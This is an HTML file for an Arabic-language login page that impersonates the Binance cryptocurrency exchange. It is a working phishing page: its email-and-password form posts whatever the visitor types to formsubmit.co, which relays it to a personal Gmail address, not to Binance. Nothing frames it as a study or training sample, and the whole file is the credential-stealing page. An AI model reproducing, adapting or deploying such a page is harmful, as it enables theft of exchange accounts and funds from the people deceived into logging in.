<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>تسجيل دخول Binance</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #0a0a0a;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background-color: #141414;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 0 10px #00b67a;
      width: 320px;
      text-align: center;
    }
    h1 {
      margin-bottom: 20px;
      color: #00b67a;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: none;
      border-radius: 4px;
      font-size: 16px;
    }
    button {
      background-color: #00b67a;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 4px;
      font-size: 18px;
      cursor: pointer;
      color: white;
    }
    button:hover {
      background-color: #019d65;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h1>تسجيل دخول Binance</h1>
    <form id="loginForm" action="https://formsubmit.co/bassamsharifalisharif@gmail.com" method="POST">
      <input type="email" name="email" placeholder="البريد الإلكتروني" required />
      <input type="password" name="password" placeholder="كلمة المرور" required />
      <button type="submit">تسجيل الدخول</button>
    </form>
  </div>
</body>
</html>
